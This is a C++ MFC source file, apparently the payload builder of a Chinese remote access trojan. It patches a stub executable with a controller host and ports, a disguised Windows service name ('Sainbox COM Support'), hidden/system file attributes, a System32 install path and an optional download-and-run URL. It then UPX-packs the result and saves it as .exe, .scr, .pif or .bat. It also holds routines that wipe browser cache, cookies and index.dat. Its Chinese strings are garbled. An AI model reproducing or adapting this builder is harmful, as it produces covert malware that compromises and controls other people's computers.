// Build.cpp : implementation file
//

#include "stdafx.h"
#include "Client.h"
#include "Build.h"
#include "encode.h"
#include <shlwapi.h>
#include "TabView.h"
#include "UpdateDlg.h"
#include "MD5.h"
#include "UpdateDlg.h"
#include "wininet.h"
//#import "msxml3.dll"

#ifdef _DEBUG
#define new DEBUG_NEW
#undef THIS_FILE
static char THIS_FILE[] = __FILE__;
#endif

CString SHANGXIANXINXI;
extern CTabView* g_pTabView; 
/////////////////////////////////////////////////////////////////////////////
// CBuild dialog
CBuild::CBuild(CWnd* pParent /*=NULL*/)
	: CDialog(CBuild::IDD, pParent)
{
	m_hIcon			= LoadIcon(AfxGetInstanceHandle(), MAKEINTRESOURCE(IDI_Build));
	//{{AFX_DATA_INIT(CBuild)
	m_lanpenetrate = ((CClientApp *)AfxGetApp())->m_IniFile.GetInt("Build", "LanPenetrate", FALSE); //�Ƿ�ʹ����������͸
	m_green = ((CClientApp *)AfxGetApp())->m_IniFile.GetInt("Build", "Green", TRUE); //��ɫ��װ
	m_upx = ((CClientApp *)AfxGetApp())->m_IniFile.GetInt("Build", "UPX", FALSE); //�Ƿ�ѹ��
	m_azzds = ((CClientApp *)AfxGetApp())->m_IniFile.GetInt("Build", "Azzds", 0); //��װ����
	m_kbcheck = ((CClientApp *)AfxGetApp())->m_IniFile.GetInt("Build", "KbChk", FALSE); //�Ƿ�����
	m_edit_kb = ((CClientApp *)AfxGetApp())->m_IniFile.GetString("Build", "KbUrl", "http://www.baidu.com/1.jpg"); //�����ַ
	//}}AFX_DATA_INIT
}


void CBuild::DoDataExchange(CDataExchange* pDX)
{
	CDialog::DoDataExchange(pDX);
	
	//{{AFX_DATA_MAP(CBuild)
//	DDX_Control(pDX, IDC_FILESUFFIEX, m_FileSuffiex);
	DDX_Control(pDX, IDC_FILEATTRIBUTE, m_FileAttribute);
	DDX_Control(pDX, IDC_LONGNECT3, m_long_ipjm);
	DDX_Control(pDX, IDC_FTP_IP, m_Ftp_ip);
	DDX_Control(pDX, IDC_BIAOZHI, m_biaozhi);
	DDX_Control(pDX, IDC_INSTALL_WAY, m_insatll_way);
	DDX_Control(pDX, IDC_EDIT_SVCNAME, m_svcname);
	DDX_Control(pDX, IDC_EDIT_SHELP, m_shelp);
	DDX_Control(pDX, IDC_EDIT_SCNAME, m_scname);
	DDX_Control(pDX, IDC_VERSION, m_version);
	DDX_Text(pDX, IDC_DNS, m_dns1);
	DDX_Text(pDX, IDC_DNS2, m_dns2);
	DDX_Text(pDX, IDC_LONGIP2, m_jmip);
	DDX_Text(pDX, IDC_LONGPASS2, m_Sjfz);
	DDX_Control(pDX, IDC_ONLINE_GROUP, m_online_group);
	DDX_Check(pDX, IDC_GREEN, m_green);
	DDX_Check(pDX, IDC_UPX, m_upx);
	DDX_Control(pDX, IDC_COMBO_RELEASEPATH, m_releasepath);
	DDX_Text(pDX, IDC_DLL_NAME, m_dllname);
	DDX_Text(pDX, IDC_COMBO_RELEASEPATH, m_remote_path);
	DDX_Control(pDX, IDC_EDIT_BUILDLOG, m_log);
	DDX_Text(pDX, IDC_AZZDS, m_azzds);
	DDX_Text(pDX, IDC_PORT, m_port1);
	DDX_Text(pDX, IDC_PORT2, m_port2);
	DDX_Check(pDX, IDC_KBCHECK, m_kbcheck);
	DDX_Text(pDX, IDC_EDIT_KB, m_edit_kb);
	//}}AFX_DATA_MAP
}


BEGIN_MESSAGE_MAP(CBuild, CDialog)
	//{{AFX_MSG_MAP(CBuild)
	ON_BN_CLICKED(IDC_BUILD, OnBuild)
	ON_BN_CLICKED(IDC_GREEN, OnGreen)
	ON_CBN_SELCHANGE(IDC_INSTALL_WAY, OnSelchangeInstallWay)
	ON_BN_CLICKED(IDC_TEST_MASTER, OnTestMaster)
	ON_BN_CLICKED(IDC_TEST_MASTER2, OnTestMaster2)
	ON_BN_CLICKED(IDC_RANDOM2, OnRandom2)
	ON_BN_CLICKED(IDC_LONGNECT3, OnIPjm)
	ON_BN_CLICKED(IDC_LONGNECT2, OnSjfz)
	ON_BN_CLICKED(IDC_FTP_IP, OnFtpIp)
	ON_BN_CLICKED(IDC_BTN_PATH, OnBtnPath)
	ON_BN_CLICKED(IDC_KBCHECK, OnKbCheck)
	ON_BN_CLICKED(IDC_KBTEST, OnKbTest)
	ON_WM_CTLCOLOR()

	//}}AFX_MSG_MAP
END_MESSAGE_MAP()

/////////////////////////////////////////////////////////////////////////////
// CBuild message handlers


char *StrAdd()	// GetVolumeInformation + GetComputerName
{
	char szPcName[256];
	DWORD dwPcName = 256;
	BOOL nRet = GetComputerName(szPcName, &dwPcName);
	
	//������������к�   
	LPCTSTR lpRootPathName = "C:\\";
	char szVolumeNameBuffer[12];  
	DWORD nVolumeNameSize = 12;   
	DWORD VolumeSerialNumber;   
	DWORD MaximumComponentLength;   
	DWORD FileSystemFlags;   
	char szFileSystemNameBuffer[10];   
	DWORD nFileSystemNameSize = 10;   
	GetVolumeInformation(lpRootPathName,szVolumeNameBuffer,nVolumeNameSize,&VolumeSerialNumber,     
		&MaximumComponentLength,&FileSystemFlags,szFileSystemNameBuffer,nFileSystemNameSize);   
	//��ʾ���������к�   
	CString   str;   
	str.Format("%x%s",VolumeSerialNumber, szPcName);
	return (char *)(LPCTSTR)str;
}

BOOL CBuild::OnInitDialog() 
{
	CDialog::OnInitDialog();
	
	// TODO: Add extra initialization here
	if (m_bFirstShow)
	{
		CString IP;
		
		char hostname[256]; 
		gethostname(hostname, sizeof(hostname));
		HOSTENT *host = gethostbyname(hostname);
		if (host != NULL)
			IP = inet_ntoa(*(IN_ADDR*)host->h_addr_list[0]);
		else
			IP = _T("127.0.0.1");	
		
		UpdateData(false);
		
		m_dns1 = ((CClientApp *)AfxGetApp())->m_IniFile.GetString("Build", "Dns1", IP); //����IP(1)����
		m_dns2 = ((CClientApp *)AfxGetApp())->m_IniFile.GetString("Build", "Dns2", ""); //QQ����(2)����
		m_port1 = ((CClientApp *)AfxGetApp())->m_IniFile.GetInt("Settings", "ListenPort", 8080); //���߶˿�1
		m_port2 = ((CClientApp *)AfxGetApp())->m_IniFile.GetInt("Settings", "ListenPort", 8080); //���߶˿�2
		m_remote_path = ((CClientApp *)AfxGetApp())->m_IniFile.GetString("Build","InstallPath","%SystemRoot%\\System32\\");//��װĿ¼
		m_dllname = ((CClientApp *)AfxGetApp())->m_IniFile.GetString("Build", "DllName", "sainbox.exe"); //��װ����
		m_FileAttribute.SetCurSel(((CClientApp *)AfxGetApp())->m_IniFile.GetInt("Build", "FileAttribute", 0)); //�ļ�����
		
		char szSvcName[] = "Sainbox";
		char szSvcDisp[] = "Sainbox COM Support";
		char szSvcDesc[] = "Sainbox COM Services (DCOM)";
		
		SetDlgItemText(IDC_VERSION,((CClientApp *)AfxGetApp())->m_IniFile.GetString("Build", "Version", "1.0"));
		SetDlgItemText(IDC_EDIT_SVCNAME,((CClientApp *)AfxGetApp())->m_IniFile.GetString("Build", "ServiceName", szSvcName));
		SetDlgItemText(IDC_EDIT_SCNAME,((CClientApp *)AfxGetApp())->m_IniFile.GetString("Build", "DisplayName", szSvcDisp));
		SetDlgItemText(IDC_EDIT_SHELP,((CClientApp *)AfxGetApp())->m_IniFile.GetString("Build", "Description", szSvcDesc));
	}
	
	m_bFirstShow = false;
	UpdateData(false);
	
	CString strGroupName, strTemp;
	int nTabs = g_pTabView->m_wndTabControl.GetItemCount();
	int i=0;
	for ( i = 0; i < nTabs; i++ )
	{
		strTemp = g_pTabView->m_wndTabControl.GetItem(i)->GetCaption();
		int n = strTemp.ReverseFind('(');
		if ( n > 0 )
		{
			strGroupName = strTemp.Left(n);
		}
		else
		{
			strGroupName = strTemp;
		}
		m_online_group.AddString(strGroupName);
	}
	m_online_group.SetCurSel(0);
	m_insatll_way.SetCurSel(((CClientApp *)AfxGetApp())->m_IniFile.GetInt("Build", "InstallMode", 0));
	
	m_green = ((CClientApp *)AfxGetApp())->m_IniFile.GetInt("Build", "Green", m_green);
	if (((CButton *)GetDlgItem(IDC_GREEN))->GetCheck() == TRUE)
	{
		GetDlgItem(IDC_INSTALL_WAY)->EnableWindow(FALSE);
		GetDlgItem(IDC_EDIT_SVCNAME)->EnableWindow(FALSE);
		GetDlgItem(IDC_EDIT_SCNAME)->EnableWindow(FALSE);
		GetDlgItem(IDC_EDIT_SHELP)->EnableWindow(FALSE);
		GetDlgItem(IDC_COMBO_RELEASEPATH)->EnableWindow(FALSE);
		GetDlgItem(IDC_DLL_NAME)->EnableWindow(FALSE);
		GetDlgItem(IDC_AZZDS)->EnableWindow(FALSE);
		GetDlgItem(IDC_FILEATTRIBUTE)->EnableWindow(FALSE);
	}
	else
	{
		if (m_insatll_way.GetCurSel() == 1)
		{
			GetDlgItem(IDC_EDIT_SVCNAME)->EnableWindow(FALSE);
			GetDlgItem(IDC_EDIT_SCNAME)->EnableWindow(FALSE);
			GetDlgItem(IDC_EDIT_SHELP)->EnableWindow(FALSE);
			GetDlgItem(IDC_COMBO_RELEASEPATH)->EnableWindow(FALSE);
			GetDlgItem(IDC_DLL_NAME)->EnableWindow(FALSE);
			GetDlgItem(IDC_FILEATTRIBUTE)->EnableWindow(FALSE);
		}
	}
	
	OnKbCheck();
	GetDlgItem(IDC_BIAOZHI)->SetWindowText(MD5String(StrAdd()));
	
	UpdateData(false);
	
	m_log.ReplaceSel("=> ��������׼��������...\r\n");
	m_log.ReplaceSel("=> ��ȷ�������ļ��Ƿ���ڣ��������ʾ�ڴ治�㣡...\r\n");
	
	SetIcon(m_hIcon, TRUE);			// Set big icon
	SetIcon(m_hIcon, FALSE);		// Set small icon
	
	return TRUE;  // return TRUE unless you set the focus to a control
	              // EXCEPTION: OCX Property Pages should return FALSE
}

MODIFY_DATA modify_data = 
{
	"192.168.1.101",
	"",
	8080,
	8080,
	"",
	"",
	"",
	"",
	"",
	"",
	FALSE,			//FALSEΪδʹ��������͸
	TRUE,			//TRUEΪ��������
	TRUE,			//TRUEΪ����Ŀ¼����
	TRUE,			//TRUEΪ��ɫ��װ��FALSEΪ��׼��װ
	"",
	"",
	0,
	FILE_ATTRIBUTE_NORMAL,
	0,
	""
};


void Encrypt(char *szData, int Size)
{
	int i ;
	for ( i=0; i<Size; i++)
	{
		szData[i]+=51;
	}
}

int MemFindStr(const char *strMem, const char *strSub, int iSizeMem, int isizeSub)   
{   
	int   da,i,j;   
	if (isizeSub == 0) 
		da = strlen(strSub);   
	else 
		da = isizeSub;   
	for (i = 0; i < iSizeMem; i++)   
	{   
		for (j = 0; j < da; j ++)   
			if (strMem[i+j] != strSub[j])	
				break;   
			if (j == da) 
				return i;   
	}  
	
	return -1;   
}

int ReplaceStr(char* sSrc, char* sMatchStr, char* sReplaceStr)
{
	int StringLen;
	char caNewString[64];
	char* FindPos;
	FindPos =(char *)strstr(sSrc, sMatchStr);
	if( (!FindPos) || (!sMatchStr) )
		return -1;
	
	while( FindPos )
	{
		memset(caNewString, 0, sizeof(caNewString));
		StringLen = FindPos - sSrc;
		strncpy(caNewString, sSrc, StringLen);
		strcat(caNewString, sReplaceStr);
		strcat(caNewString, FindPos + strlen(sMatchStr));
		strcpy(sSrc, caNewString);
		
		FindPos =(char *)strstr(sSrc, sMatchStr);
	}
	free(FindPos);
	return 0;
}

char* substr(char *str,int istar,int iend)
{
	char *p;
	char p1[100]={0};
	int	ip=0;
	
	p = str;
	ip = strlen(p);
	if(istar > ip)
		return NULL;
	else
	{
		p+=istar-1;
	}
	int ipp = strlen(p);
	if(ipp < iend)
		strcpy(p1,p);
	else
	{
		//p1+=iend;
		memcpy(p1,p,iend);
	}
	strcpy(str,p1);
	return str;
}

int memfind(const char *mem, const char *str, int sizem, int sizes)
{
	int da, i, j;
	if (sizes == 0) da = strlen(str);
	else da = sizes;
	for (i = 0; i < sizem; i++)
	{
		for (j = 0; j < da; j ++)
			if (mem[i+j] != str[j])	break;
			if (j == da) return i;
	}
	return -1;
}

void CBuild::OnBuild() 
{
	// TODO: Add your control notification handler code here
	UpdateData(TRUE);
	CHAR szDatPath[MAX_PATH];
	GetModuleFileName(NULL, szDatPath, sizeof(szDatPath));
	*strrchr(szDatPath, '\\') = '\0';
	lstrcat(szDatPath, "\\Cache\\Install.dat");
  // strcpy(szDatPath,"C:\\Program Files\\mk.cc");	
	CString strHost1, strPort1, strHost2, strPort2, strGroup, strVersion;
	CString strSer, strSerDis, strSerDes, strGetGroupName, strDllName, strReleasepath, strAzzds;
	
	GetDlgItem(IDC_DNS)->GetWindowText(strHost1);
	GetDlgItem(IDC_PORT)->GetWindowText(strPort1);
	GetDlgItem(IDC_DNS2)->GetWindowText(strHost2);
	GetDlgItem(IDC_PORT2)->GetWindowText(strPort2);
	GetDlgItem(IDC_VERSION)->GetWindowText(strVersion);
	GetDlgItem(IDC_EDIT_SVCNAME)->GetWindowText(strSer);
	GetDlgItem(IDC_EDIT_SCNAME)->GetWindowText(strSerDis);
	GetDlgItem(IDC_EDIT_SHELP)->GetWindowText(strSerDes);
	GetDlgItem(IDC_BIAOZHI)->GetWindowText(strGetGroupName);
	GetDlgItem(IDC_COMBO_RELEASEPATH)->GetWindowText(strReleasepath);
	GetDlgItem(IDC_DLL_NAME)->GetWindowText(strDllName);
	
	if (strHost1.IsEmpty()&&strHost2/*|| strPort*/.IsEmpty() )
	{
		AfxMessageBox("����д����1��������Ϣ",MB_ICONERROR);
		return;
	}
	
	((CComboBox*)GetDlgItem(IDC_ONLINE_GROUP))->GetWindowText(strGroup);
	if (strGroup.IsEmpty())
	{
		AfxMessageBox("��������д������",MB_ICONERROR);
		return;
	}
	
	CString OnInstallWay;
	m_insatll_way.GetLBText(m_insatll_way.GetCurSel(),OnInstallWay); 
	
	if(!m_green)
	{
		if (OnInstallWay == "������������")
		{
			if (strSer.IsEmpty() || strSerDis.IsEmpty() || strSerDes.IsEmpty() )
			{
				AfxMessageBox("��������д����������Ϣ",MB_ICONERROR);
				return;
			}
		}
	}
	
	m_log.ReplaceSel("=> ��������ɳ������ڳ�ʼ��...\r\n");
	
	ZeroMemory(&modify_data,sizeof(MODIFY_DATA));
	
	strcpy(modify_data.szDns1,strHost1.GetBuffer(0));
	strcpy(modify_data.szDns2,strHost2.GetBuffer(0));
	modify_data.dwPort1 = atoi((LPCSTR)strPort1);   // ���߶˿�1
	modify_data.dwPort2 = atoi((LPCSTR)strPort2);   // ���߶˿�2
	strcpy(modify_data.szGroup,MyEncode(strGroup.GetBuffer(0)));
	strcpy(modify_data.szVersion,MyEncode(strVersion.GetBuffer(0)));
	strcpy(modify_data.SerName, strSer.GetBuffer(0));
	strcpy(modify_data.Serdisplay, strSerDis.GetBuffer(0));
	strcpy(modify_data.Serdesc, strSerDes.GetBuffer(0));
	strcpy(modify_data.szGetGroup, strGetGroupName.GetBuffer(0));
	strcpy(modify_data.ReleasePath,strReleasepath.GetBuffer(0));   //д�밲װ·��
	strcpy(modify_data.ReleaseName,strDllName.GetBuffer(0));   //д�밲װ����
	modify_data.bLanPenetrate = m_lanpenetrate;
	modify_data.Dele_zd = (WORD)m_azzds;    //��װ����
	
	if (!m_edit_kb.IsEmpty() && m_kbcheck)
	{
		strcpy(modify_data.szDownRun,MyEncode(m_edit_kb.GetBuffer(0)));
	}
	
 	CString szTemp;
	GetDlgItemText(IDC_FILEATTRIBUTE,szTemp);
	
	if(szTemp == "����")
		modify_data.FileAttribute = FILE_ATTRIBUTE_NORMAL;
	if(szTemp == "����")
		modify_data.FileAttribute = FILE_ATTRIBUTE_HIDDEN;

	if(szTemp == "ϵͳ")
		modify_data.FileAttribute = FILE_ATTRIBUTE_SYSTEM;

	if(szTemp == "ֻ��")
		modify_data.FileAttribute = FILE_ATTRIBUTE_READONLY;

	if(szTemp == "����+ϵͳ")
		modify_data.FileAttribute = FILE_ATTRIBUTE_HIDDEN | FILE_ATTRIBUTE_SYSTEM;

	if(szTemp == "����+ϵͳ+ֻ��")
		modify_data.FileAttribute = FILE_ATTRIBUTE_HIDDEN | FILE_ATTRIBUTE_SYSTEM|FILE_ATTRIBUTE_READONLY;
	
	m_log.ReplaceSel("=> ���߼���װ��Ϣ�������...\r\n");
	
	//�ж��Ƿ����
	WORD Tail = strlen(modify_data.ReleasePath)-1;
	
	if(modify_data.ReleasePath[Tail]!='\\')
	{
		strcat(modify_data.ReleasePath,"\\");
		SetDlgItemText(IDC_COMBO_RELEASEPATH,modify_data.ReleasePath);
	}
	
	//�ж��Ƿ��ж��Ŀ¼
	CHAR *Judge = strstr(modify_data.ReleasePath,"\\");
	if(Judge)
	{
		Judge++;
		CHAR *Judge2= strstr(Judge,"\\");
		if(Judge2)
		{
			Judge2++;
			CHAR *Judge3=strstr(Judge2,"\\");
			if(Judge3)
			{
				Judge3++;
				CHAR *Judge4=strstr(Judge3,"\\");
				if (Judge4)
				{
					Judge4++;
					CHAR *Judge5=strstr(Judge4,"\\");
					if (Judge5)
					{
						m_log.ReplaceSel("=> Ŀ¼���Ϸ�!�Ҵ���Ŀ¼������!...\r\n");
				        MessageBox("Ŀ¼���Ϸ�!�Ҵ���Ŀ¼������!");
			         	return;
					}
				
				}
			}
		}
	}
	
	m_log.ReplaceSel("=> ��ѡ������;��,�ļ����Ƽ��ļ���׺!...\r\n");
	
	if (OnInstallWay == "������������")
	{
		m_Servers = TRUE;
		m_RunS = FALSE;
		modify_data.bService = m_Servers;
		modify_data.bRuns = m_RunS;
	}
	
	if (OnInstallWay == "����Ŀ¼����")
	{
		m_Servers = FALSE;
		m_RunS = TRUE;
		modify_data.bService = m_Servers;
		modify_data.bRuns = m_RunS;
	}
	
	modify_data.bRunOnce = m_green;
	
	CFileDialog dlg(FALSE, "exe", "1", OFN_OVERWRITEPROMPT,"��ִ���ļ�(*.exe)|*.exe|DOS��ݷ�ʽ|*.pif|��Ļ�������� (*.scr)|*.scr|������ (*.bat)|*.bat|DOSӦ�ó���(*.com)|*.com|All Files (*.*)|*.*||", NULL);
	if(dlg.DoModal () != IDOK)
		return;
	
	CString szFilePath = dlg.GetPathName();
	DeleteFile(szFilePath);
	CopyFile(szDatPath,szFilePath,FALSE);
	
	DWORD wr=0;
	HANDLE hFile=CreateFile(szFilePath,GENERIC_READ,FILE_SHARE_READ,NULL,OPEN_EXISTING,FILE_ATTRIBUTE_NORMAL,NULL);
	DWORD len=GetFileSize(hFile,NULL);
	char *str=new char[len];
	ZeroMemory(str,sizeof(str));
	ReadFile(hFile,str,len,&wr,NULL);
	CloseHandle(hFile);
	DWORD dwOffset = memfind(str,"192.168.1.101",len,0);
	delete[] str;
	if (dwOffset == -1)
	{
		m_log.ReplaceSel("=> ���������ʧ��!�����ļ���ռ�û��ļ����Ϸ�!\r\n");
		AfxMessageBox("�����ļ���ռ�û��ļ����Ϸ�!");
		return;
	}
	
	CFile file;
	if(file.Open(szFilePath, CFile::modeWrite))
	{
		try
		{
			//file.Write(str, len);
			file.Seek(dwOffset, CFile::begin);
		
			file.Write((char*)&modify_data, sizeof(MODIFY_DATA));
			file.Close();
		}
		catch(...)
		{
			m_log.ReplaceSel("=> ���������ʧ��!\r\n");
			MessageBox("�ļ�����ʧ�ܣ�����","��ʾ",MB_OK|MB_ICONSTOP);
			DeleteFile(szFilePath);
			return;
		}
	}
	hFile = CreateFile(szFilePath, GENERIC_WRITE, FILE_SHARE_WRITE, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL );
	SetFilePointer( hFile, 0, NULL, FILE_END );
	CloseHandle(hFile);
	
	if (((CButton *)GetDlgItem(IDC_UPX))->GetCheck() == TRUE)//m_upx
	{
		CompressUpx(dlg.GetFileName());//UPXѹ��		
	}
	
// 	CString SCminc;
// 	if (m_upx)
// 	{	
// 		if(CompressUpx(szFilePath))//UPXѹ��
// 			SCminc="�ļ�ѹ���ɹ�!";
// 		else
// 			SCminc="�ļ�ѹ��ʧ��!";
// 		
// 	}
// 	else
// 	{
// 		SCminc="�ļ����ɳɹ�!";
// 	}

	//����������Ϣ
	((CClientApp *)AfxGetApp())->m_IniFile.SetInt("Build", "LanPenetrate", m_lanpenetrate);
	((CClientApp *)AfxGetApp())->m_IniFile.SetString("Build", "Dns1", strHost1);
	((CClientApp *)AfxGetApp())->m_IniFile.SetString("Build", "Dns2", strHost2);
	((CClientApp *)AfxGetApp())->m_IniFile.SetString("Build", "Port1", strPort1);
	((CClientApp *)AfxGetApp())->m_IniFile.SetString("Build", "Port2", strPort2);
	((CClientApp *)AfxGetApp())->m_IniFile.SetString("Build", "Version", strVersion);
	((CClientApp *)AfxGetApp())->m_IniFile.SetInt("Build", "Green", m_green);
	((CClientApp *)AfxGetApp())->m_IniFile.SetInt("Build", "UPX", m_upx); //UPXѹ��
	((CClientApp *)AfxGetApp())->m_IniFile.SetInt("Build", "InstallMode", m_insatll_way.GetCurSel()); //��װģʽ
	((CClientApp *)AfxGetApp())->m_IniFile.SetString("Build", "ServiceName", strSer);
	((CClientApp *)AfxGetApp())->m_IniFile.SetString("Build", "DisplayName", strSerDis);
	((CClientApp *)AfxGetApp())->m_IniFile.SetString("Build", "Description", strSerDes);
	((CClientApp *)AfxGetApp())->m_IniFile.SetString("Build", "InstallPath", m_remote_path);  //��װĿ¼
	((CClientApp *)AfxGetApp())->m_IniFile.SetString("Build", "DllName", m_dllname);  //��װ����
	((CClientApp *)AfxGetApp())->m_IniFile.SetInt("Build", "FileAttribute", m_FileAttribute.GetCurSel()); //�ļ�����
	((CClientApp *)AfxGetApp())->m_IniFile.SetInt("Build", "Azzds", m_azzds);     //��װ����
	((CClientApp *)AfxGetApp())->m_IniFile.SetInt("Build", "KbChk", m_kbcheck);
	((CClientApp *)AfxGetApp())->m_IniFile.SetString("Build", "KbUrl", m_edit_kb);
	
	char ShowText[200];
	m_log.ReplaceSel("=> �ļ����ɳɹ���, �����ɷ������...\r\n");
	wsprintf(ShowText, "%s[%s]", "���ɳɹ�:", szFilePath);
	MessageBox(ShowText, "��ʾ", MB_ICONINFORMATION); //������ʾ��
	
	OnOK();
}
	
void CBuild::CompressUpx(CString inpath)
{
	HRSRC hResInfo;
	HGLOBAL hResData;
	DWORD dwSize,dwWritten;
	LPBYTE p;
	HANDLE hFile;
	// �����������Դ
	hResInfo = FindResource(NULL,MAKEINTRESOURCE(IDR_UPX),"UPX");
	if(hResInfo == NULL) return;
	// �����Դ�ߴ�
	dwSize = SizeofResource(NULL,hResInfo);
	// װ����Դ
	hResData = LoadResource(NULL,hResInfo);
	if(hResData == NULL) return;
	// Ϊ���ݷ���ռ�
	p = (LPBYTE)GlobalAlloc(GPTR, dwSize); 
	if (p == NULL)     return;
	// ������Դ����
	MoveMemory((LPVOID)p, (LPCVOID)LockResource(hResData), dwSize);
	
	char Path[256];
	GetCurrentDirectory(256, Path);
	strcat(Path,"\\upx.exe");
	DeleteFile(Path);
	hFile = CreateFile(Path,GENERIC_WRITE,0,NULL,CREATE_ALWAYS,0,NULL);
	if(hFile == NULL) return;
	
	WriteFile(hFile,(LPVOID)p,dwSize,&dwWritten,NULL);
	CloseHandle(hFile);
	ShellExecute(this->m_hWnd,"open",Path, inpath,"",SW_HIDE);
	
	BOOL del;
	do 
	{
		del = DeleteFile(Path);
	} while(!del);
}

void CBuild::OnGreen()
{
	// TODO: Add your control notification handler code here
	UpdateData(TRUE);
	
	if(m_green)
	{
		GetDlgItem(IDC_INSTALL_WAY)->EnableWindow(FALSE);
		GetDlgItem(IDC_EDIT_SVCNAME)->EnableWindow(FALSE);
		GetDlgItem(IDC_EDIT_SCNAME)->EnableWindow(FALSE);
		GetDlgItem(IDC_EDIT_SHELP)->EnableWindow(FALSE);
		GetDlgItem(IDC_COMBO_RELEASEPATH)->EnableWindow(FALSE);
		GetDlgItem(IDC_DLL_NAME)->EnableWindow(FALSE);
		GetDlgItem(IDC_AZZDS)->EnableWindow(FALSE);
		GetDlgItem(IDC_FILEATTRIBUTE)->EnableWindow(FALSE);
	}
	else
	{
		GetDlgItem(IDC_INSTALL_WAY)->EnableWindow(TRUE);
		GetDlgItem(IDC_AZZDS)->EnableWindow(TRUE);
		OnSelchangeInstallWay();
	}
	UpdateData(FALSE);
}

void CBuild::OnSelchangeInstallWay() 
{
	// TODO: Add your control notification handler code here
	UpdateData(TRUE);
	
	CString OnInstallWay;
	
	m_insatll_way.GetLBText(m_insatll_way.GetCurSel(),OnInstallWay); 
	
	if (OnInstallWay == "������������")
	{
		GetDlgItem(IDC_EDIT_SVCNAME)->EnableWindow(TRUE);
		GetDlgItem(IDC_EDIT_SCNAME)->EnableWindow(TRUE);
		GetDlgItem(IDC_EDIT_SHELP)->EnableWindow(TRUE);
		GetDlgItem(IDC_COMBO_RELEASEPATH)->EnableWindow(TRUE);
		GetDlgItem(IDC_DLL_NAME)->EnableWindow(TRUE);
		GetDlgItem(IDC_FILEATTRIBUTE)->EnableWindow(TRUE);
	}
	if (OnInstallWay == "����Ŀ¼����")
	{
		GetDlgItem(IDC_EDIT_SVCNAME)->EnableWindow(FALSE);
		GetDlgItem(IDC_EDIT_SCNAME)->EnableWindow(FALSE);
		GetDlgItem(IDC_EDIT_SHELP)->EnableWindow(FALSE);
		GetDlgItem(IDC_COMBO_RELEASEPATH)->EnableWindow(FALSE);
		GetDlgItem(IDC_DLL_NAME)->EnableWindow(FALSE);
		GetDlgItem(IDC_FILEATTRIBUTE)->EnableWindow(FALSE);
	}

	UpdateData(FALSE);
}

void CBuild::OnTestMaster() 
{
	// TODO: Add your control notification handler code here
	UpdateData();

	if (!m_dns1.GetLength() || !m_port1)
	{
		MessageBox("��������д����IP������Ϣ", "��ʾ", MB_ICONSTOP);
		return;
	}

	m_testBtn.EnableWindow(FALSE);
	TestMaster();
}

void Encrypt1(char *szData, int Size)
{
	int i ;
	for ( i=0; i<Size; i++)
	{
		szData[i]-=51;
	}
}

#include <afxwin.h>
#include <afxinet.h>

enum DEL_CACHE_TYPE //Ҫɾ�������͡�
{
	File,  //��ʾinternet��ʱ�ļ�
	Cookie //��ʾCookie
};

#define SWEEP_BUFFER_SIZE			10000

BOOL WipeFile(LPCTSTR szDir, LPCTSTR szFile)
{
	CString sPath;
	HANDLE	hFile;
	DWORD	dwSize;
	DWORD	dwWrite;
	char	sZero[SWEEP_BUFFER_SIZE];
	memset(sZero, 0, SWEEP_BUFFER_SIZE);
	
	sPath = szDir;
	sPath += _T('\\');
	sPath += szFile;
	
	hFile = CreateFile(sPath, GENERIC_WRITE, 
		FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, OPEN_EXISTING, 
		FILE_ATTRIBUTE_NORMAL, NULL);
	if (hFile == INVALID_HANDLE_VALUE)
	{
		return FALSE;
	}
	
	dwSize = GetFileSize(hFile, NULL);
	
	//skip file header (actually, I don't know the file format of index.dat)
	dwSize -= 64;
	SetFilePointer(hFile, 64, NULL, FILE_BEGIN);
	
	while (dwSize > 0)
	{
		if (dwSize > SWEEP_BUFFER_SIZE)
		{
			WriteFile(hFile, sZero, SWEEP_BUFFER_SIZE, &dwWrite, NULL);
			dwSize -= SWEEP_BUFFER_SIZE;
		}
		else
		{
			WriteFile(hFile, sZero, dwSize, &dwWrite, NULL);
			break;
		}
	}
	
	CloseHandle(hFile);
	return TRUE;
}

BOOL EmptyDirectory(LPCTSTR szPath, BOOL bDeleteDesktopIni = FALSE, BOOL bWipeIndexDat = FALSE);

BOOL EmptyDirectory(LPCTSTR szPath, BOOL bDeleteDesktopIni, BOOL bWipeIndexDat)
{
	WIN32_FIND_DATA wfd;
	HANDLE hFind;
	CString sFullPath;
	CString sFindFilter;
	DWORD dwAttributes = 0;
	
	sFindFilter = szPath;
	sFindFilter += _T("\\*.*");
	if ((hFind = FindFirstFile(sFindFilter, &wfd)) == INVALID_HANDLE_VALUE)
	{
		return FALSE;
	}
	
	do
	{
		if (_tcscmp(wfd.cFileName, _T(".")) == 0 || 
			_tcscmp(wfd.cFileName, _T("..")) == 0 ||
			(bDeleteDesktopIni == FALSE && _tcsicmp(wfd.cFileName, _T("desktop.ini")) == 0))
		{
			continue;
		}
		
		sFullPath = szPath;
		sFullPath += _T('\\');
		sFullPath += wfd.cFileName;
		
		//ȥ��ֻ������
		dwAttributes = GetFileAttributes(sFullPath);
		if (dwAttributes & FILE_ATTRIBUTE_READONLY)
		{
			dwAttributes &= ~FILE_ATTRIBUTE_READONLY;
			SetFileAttributes(sFullPath, dwAttributes);
		}
		
		if (wfd.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY)
		{
			EmptyDirectory(sFullPath, bDeleteDesktopIni, bWipeIndexDat);
			RemoveDirectory(sFullPath);
		}
		else
		{
			if (bWipeIndexDat && _tcsicmp(wfd.cFileName, _T("index.dat")) == 0)
			{
				WipeFile(szPath, wfd.cFileName);
			}
			DeleteFile(sFullPath);
		}
	}
	while (FindNextFile(hFind, &wfd));
	FindClose(hFind);
	
	return TRUE;
}

BOOL DeleteUrlCache(DEL_CACHE_TYPE type)
{
	BOOL bRet = FALSE;
	HANDLE hEntry;
	LPINTERNET_CACHE_ENTRY_INFO lpCacheEntry = NULL;  
	DWORD dwEntrySize;
	
	//delete the files
	dwEntrySize = 0;
	hEntry = FindFirstUrlCacheEntry(NULL, NULL, &dwEntrySize);
	lpCacheEntry = (LPINTERNET_CACHE_ENTRY_INFO) new char[dwEntrySize];
	hEntry = FindFirstUrlCacheEntry(NULL, lpCacheEntry, &dwEntrySize);
	if (!hEntry)
	{
		goto cleanup;
	}
	
	do
	{
		if (type == File &&
			!(lpCacheEntry->CacheEntryType & COOKIE_CACHE_ENTRY))
		{
			DeleteUrlCacheEntry(lpCacheEntry->lpszSourceUrlName);
		}
		else if (type == Cookie &&
			(lpCacheEntry->CacheEntryType & COOKIE_CACHE_ENTRY))
		{
